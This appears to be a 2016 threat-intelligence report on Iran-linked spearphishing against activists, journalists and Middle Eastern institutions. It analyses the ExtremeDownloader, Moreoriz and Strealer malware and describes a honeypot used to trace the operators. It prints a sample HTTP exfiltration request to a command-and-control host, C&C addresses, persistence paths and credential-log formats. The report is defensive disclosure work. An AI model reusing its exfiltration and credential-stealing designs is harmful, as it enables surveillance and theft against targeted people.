The social**\n\n**engineering techniques and technical operations connected to these spearphishing attempts was moderately**\n\n**more refined than other incidents, and therefore warranted further scrutiny. On initial observation, we find a�**\n\n**diverse set of tactics that have been used to compromise at least ninety uniquely identifiable malware victims�**\n\n**within a limited window into the overall activities, with more intrusions through credential theft. These**\n\n**spearphishing campaigns are also notable since their targeting is more broad than Iranians activists, and**\n\n**have a demonstrable interest in targets in Saudi Arabia, Iraq and Palestine.**\n\n**This public notice is intended to describe a series of intrusions conducted through a suite of custom and off-**\n\n**the-shelf malware agents targeting interests aligned with the Iranian security policies. We also provide some**\n\n**insight into the nature of the operators provided by their engagement in a honeypot under our control.**\n\n## I N C I D E N T A N D I M P A C T\n\n**On August 4, 2016, the Gmail account of an**\n\n**unknown individual was compromised in order to**\n\n**conduct spearphishing campaigns against a**\n\n**diverse set of targets related to Iran. The**\n\n**spearphishing attempt posed as a message from**\n\n**the Director of United for Iran, a U.S.-based human**\n\n**rights organization, claiming that the organization**\n\n**had developed a secure communications tool for**\n\n**activists. The message was sent from an account**\n\n**created under her name on lesser known email**\n\n**provider (1&1’s Mail.com), a common tactic in**\n\n**recent months, with a link to a file hosted on Dropbox and an additional credential phishing attempt. Once the�**\n\n**observed Gmail account was under their control, the actors then forwarded malware to over a hundred of**\n\n**their contacts ranging from an address for the United Nations Refugee Agency in Turkey to a site contact for**\n\n\n-----\n\n**The incident represents only a more recent example of a common set of tactic and tools that have been used**\n\n**by a discrete set of actors in Iran. Over the summer, we have found similar spearphishing attempts posing an**\n\n**array of commonplace software, including Adobe Flash, TeamSpeak, Mozilla Firefox, and a video game**\n\n**services company (Multiplay). Still other cases have included documents with embedded malware. In all of**\n\n**these cases, the software is a primary stage dropper that provides reconnaissance and remote access for**\n\n**further intrusions.**\n\n**Our initial observation of the dropper and the**\n\n**social engineering tactics came out a series of**\n\n**documents that were sent to European human**\n\n**rights advocates in July. These documents were**\n\n**similarly sent from an impersonation account for**\n\n**well-known organizations created on Mail.com,**\n\n**under the pretense of important news. The**\n\n**malware was embedded as an object in the**\n\n**document that would be activated when the target**\n\n**clicked on an icon, typically posing as an Excel file�**\n\n**or an image, which the message would claim were**\n\n**lists of names or other items pertinent to the**\n\n**target.**\n\n**In our August 24 public notice** **\"Increased Use of**\n\n**Android Malware Targeting Journalists,\" we**\n\n**documented a set of remote access tools for the**\n\n**Android platform being used by Iranian actors to**\n\n**target dissidents and independent media outside of the country. Included in that report was one commonplace**\n\n**tool, DroidJack, which masqueraded as a secure communications tools. As recently as Sunday, August 28,**\n\n**this RAT was used once again to target journalists and the foreign policy establishment, when the Telegram of**\n\n**one prominent journalist was compromised – in this case, posing as an additional set of stickers for Telegram.**\n\n**In this case, the RAT appeared to provide the intruders a vector to access Telegram credentials for individuals**\n\n**outside of Iran, which is relevant to our description of other tactics used to breach users of the extremely**\n\n**popular service. The Android malware in the previous notice mirrored a sustained campaign that we had**\n\n**begun monitoring, including both agents impersonating TeamSpeak. Once again, in the case of the Telegram**\n\n**sticker incident, Android malware was sent alongside a custom Windows agent.**\n\n\n-----\n\n**The concurrent targeting and inclusion of both the custom Windows malware and the DroidJack APKs on one**\n\n**fictitious download site leads us to believe that the same group is behind the attempts. These campaigns�**\n\n**have occurred alongside Rocket Kitten infrastructure, but are conducted in a more professional manner with**\n\n\n-----\n\n**their Iranian origin and alignment with state interests.**\n\n**Based on records from multiple command and control servers, we find a distributed set of victims of the�**\n\n**malware, primarily Iranians inside of the country, Iranians abroad, and institutions in the Arabic-speaking**\n\n**Middle East and North Africa. As we noted in our update on the Infy campaign in the Technical Preview,**\n\n**mapping victimology based purely on IP addresses can be especially hard when it comes to Iran, due to the**\n\n**widespread use of circumvention tools. However, we believe that the overall themes found within such**\n\n**analysis are correct. The victimology of the malware also aligns with observed patterns in the targeting of**\n\n**credential phishing and other social engineering activities by the group. In the interest of expediency, the**\n\n**victimology and full set of tactics is not in scope of this disclosure, and instead we will provide more details on**\n\n**the themes within our full publication.**\n\n## M A L W A R E\n\n**As described previously, this actor makes use of a number of social engineering tricks. These tricks might**\n\n**vary in nature, but quite often they involve bundling legitimate software installers with a copy of one of their**\n\n**malware.**\n\n**In the case of the TeamSpeak.EXE payload, once the bundle is executed it installs and launches the first�**\n\n**stage of their malware toolset, normally located at %AppData%\\Roaming\\Microsoft\\SpoonBuster\\dwm.exe.**\n\n**We call this first stage sample ExtremeDownloader, due to a debug string that was left in the binary.�**\n\n\n**_C:\\Users\\Not Found\\Documents\\Visual Studio_**\n\n**_2013\\Projects\\ExtremeDownloader_alijavad_952\\trunk\\Downloader\\Release\\Downloader.pdb_**\n\n\n**The general purpose of ExtremeDownloader is to collect information on the infected system, send this**\n\n**information to a remote location, and wait for instructions to eventually download and execute further**\n\n**malicious software. All the exfiltrated information is then categorized by an identifier which is the combination�**\n\n**of the computer name and the hard disk volume serial number.**\n\n\n-----\n\n**This also includes a public 1024 RSA key:**\n\n**-----BEGIN PUBLIC KEY-----**\n\n**MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPlwHiG068RYDD1NLvCFAWNMs6**\n\n**VR4I2kNuTei/+rCnUuj92hDFFXrntXIi7LLn8XsB3ls1sJ0RcAcrKVzQgzY+DOOT**\n\n**A4dhOpFlO3v/bj3OwRqCdNJwJJfpYCBYQaLND9eo49BCK+pwVVB55TJYjCkVowGx**\n\n**ZfJJdjYc3oDZKbKOawIDAQAB**\n\n**-----END PUBLIC KEY-----**\n\n**In order to profile the system, ExtremeDownloader collects an extensive amount of details, including�**\n\n**information on the hardware, the networking, the existing users, processes, and services. In doing so, the**\n\n**malware makes extensive use of WMI.**\n\n\n-----\n\n**The aggregated profile is then posted to the C&C with an HTTP request like following:�**\n\n**POST /utility/update/post.php HTTP/1.1**\n\n**Accept: */***\n\n**Content-Type: multipart/form-data; boundary=D514116929C24f35AE047F2B82C59B08**\n\n**Content-Length: 49810**\n\n**User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2**\n\n**Host: www.apache-utility.com**\n\n**Cache-Control: no-cache**\n\n**--D514116929C24f35AE047F2B82C59B08**\n\n**Content-Disposition: form-data; name=\"EKY\"**\n\n**Ofin**\n\n**--D514116929C24f35AE047F2B82C59B08**\n\n**Content-Disposition: form-data; name=\"ID\"**\n\n**_[COMPUTER_IDENTIFIER]_**\n\n**--D514116929C24f35AE047F2B82C59B08**\n\n**Content-Disposition: form-data; name=\"Data\"**\n\n**The content of the “Data” section would be the computer profile in encrypted form, which would then be�**\n\n**stored in a dedicated folder on the C&C with the file name SysInfo.txt.�**\n\n**At this point, we believe the attackers would selectively decide which infected computers to compromise**\n\n**further with the second stage malware. If instructed to do so, ExtremeDownloader would then download an**\n\n**executable normally named contask.exe. We refer to this particular payload as Moreoriz, because of a mutex**\n\n**it creates with name Global\\Moreoriz, or simply Dropper, also due to a debug string found in the binary:**\n\n\n-----\n\n**This second stage dropper is limited in functionality, and it mostly used just to connect to a second Command**\n\n**& Control server located at 5.152.202.53 on port 4545, to download and execute a copy of Metasploit**\n\n**Meterpreter in order to grant a reverse shell to the attackers. In an effort to lure the attackers into interacting**\n\n**with us that we describe in the following section of this report, we managed to obtain one of the collection**\n\n**utilities they make use of. We refer to this malware as Strealer, also because of a debug string available in the**\n\n**binary (please note the typo):**\n\n\n**_C:\\Users\\AB)\\Documents\\Visual Studio 2013\\Projects\\Strealer\\Stealer_Final\\Release\\Stealer.pdb_**\n\n\n**While the name of the project and functionality recalls the Stealer malware of Flying Kitten, there does not**\n\n**appear to be a relation between the agents as they don't appear to significantly share characteristics.�**\n\n**Once executed, Strealer first checks whether it is installed with persistence, and if not it copies itself to the�**\n\n**location %AppData%\\Local\\Mozilla\\Profiles\\MozillaService.exe and instantiates a new process from there.�**\n\n**The purpose of Strealer is to steal credentials and cookies from web browsers. Its design is very simple, and**\n\n**yet effective. Strealer knows how to locate, decrypt, and read stored credentials and cookies from Internet**\n\n**Explorer, Firefox, Chrome, and Opera. These stolen credentials are then normally stored in a JSON-like**\n\n**format in the %AppData%\\Local\\Mozilla\\Profiles\\Log under the names for example like chromeLogins.sql and�**\n\n**chromeCookies.sql.**\n\n**In the case of credentials, the log format would be:**\n\n\n**_{\\\"Username\\\":\\\"%s\\\",\\\"Password\\\":\\\"%s\\\",\\\"url\\\":\\\"%s\\\"}_**\n\n\n**While the following format is used for logging stolen cookies:**\n\n**_{\\\"id\\\":\\\"%S\\\",\\\"host\\\":\\\"%S\\\",\\\"name\\\":\\\"%S\\\",\\\"value\\\":\\\"%S\\\",\\\"path\\\":\\\"%S\\\",\\\"expiry\\\":\\\"%S\\\",\\\"isHttpOnly\\\":\\\"%S\\_**\n\n\n**_\\\"isSecure\\\":\\\"%S\\\",\\\"hostOnly\\\":\\\"%S\\\",\\\"session\\\":\\\"%S\\\",\\\"storeId\\\":\\\"%S\\\"}_**\n\n\n**Additionally, the malware is also provided with a generic keylogger and clipboard stealer, which are simply**\n\n**implemented with the traditional GetClipboardData and GetKeyboardState/GetKeyState techniques. The**\n\n**intercepted keystrokes and clipboard are then nicely logged in detail in a dedicated file normally located at�**\n\n**%AppData%\\Local\\Mozilla\\Profiles\\Log\\kgservice.sql. Following is an indicative content of how the keylogger�**\n\n**log file would look like:�**\n\n\n-----\n\n**date: 2016/8/31 time: 17:28:53**\n\n**[Ctrl]**\n\n**[Chrome - Google Chrome]**\n\n**date: 2016/8/31 time: 17:28:53**\n\n**google.com[Enter]**\n\n**[New Tab - Google Chrome]**\n\n**date: 2016/8/31 time: 17:28:55**\n\n**[Ctrl]**\n\n**[Untitled - Google Chrome]**\n\n**date: 2016/8/31 time: 17:28:55**\n\n**password[Ctrl]**\n\n**********Start Clipboard*********\n\n**password**\n\n**********END Clipboard*********\n\n**These logs are then collected and posted to yet another Command & Control server located at update-**\n\n**finder.com. The structure utilized in the HTTP exfiltration protocol, is very much similar to the ones adopted by�**\n\n**ExtremeDownloader.**\n\n## O P E R A T O R S\n\n**When realizing that in the chain of compromise the attackers would manually interact with infected computers**\n\n**through the use of a Meterpreter shell, we decided to set up a “honeypot.” We created a somewhat realistic**\n\n**virtualized workstation which would appear belonging to a person engaged in researching on human rights**\n\n**abuses in Iran. We downloaded publicly available reports, created a realistic folder structure, and installed**\n\n**various commodity software that a regular person would use. Then we infected the “honeypot” workstation**\n\n**with the Dropper, let it report back to its Command & Control and waited for activity.**\n\n**Approximately one hour later we observed activity on the system. The attackers connected through their**\n\n**Metasploit reverse shell, installed a copy of TightVNC, installed a copy of their Strealer backdoor and started**\n\n**exfiltrating data from our honeypot, while we pretended to unsuspectingly keep on working on document�**\n\n**drafts and reading reports from various human rights organizations, and chatting to some fictitious third�**\n\n**person about some upcoming campaign.**\n\n**When we noticed that some of the reports and documents we had downloaded from the Internet and placed**\n\n**in the workstation were being exfiltrated by the attackers, we swiftly created some documents with the�**\n\n**[CanaryTokens service that had credible and interesting file names pertinent to human rights issues in Iran,�](http://www.canarytokens.com)**\n\n**and placed them among other original files. CanaryTokens embeds remote resources as triggers inside�**\n\n**commonplace document, for example Office files, to notify whenever they are opened and identify from which�**\n\n**IP address. Surely enough, the attackers exfiltrated the baits, and opened them, resulting in alerts being�**\n\n**delivered to us.**\n\n\n-----\n\n**The IP address from which the bait documents were opened appeared to be a VPN endpoint. We then**\n\n**attempted creating similar bait documents with different file formats, in order to see whether that would trigger�**\n\n**a different behavior. Interestingly, this led to the attackers exfiltrating and opening these newer documents�**\n\n**too, possibly from a different location, exposing what we believe to be their actual originating IP address.**\n\n**This suggests the attackers are in fact of Iranian origin, and might be located in the city of Karaj, not far from**\n\n**the capital Tehran.**\n\n## C O N T A C T\n\n**Certain information has been withheld for privacy or operational reasons outlined above, but we are happy to**\n\n**provide information to security professionals and targeted organizations in order to support defensive work.**\n\n**We also welcome samples and feedback on our research.
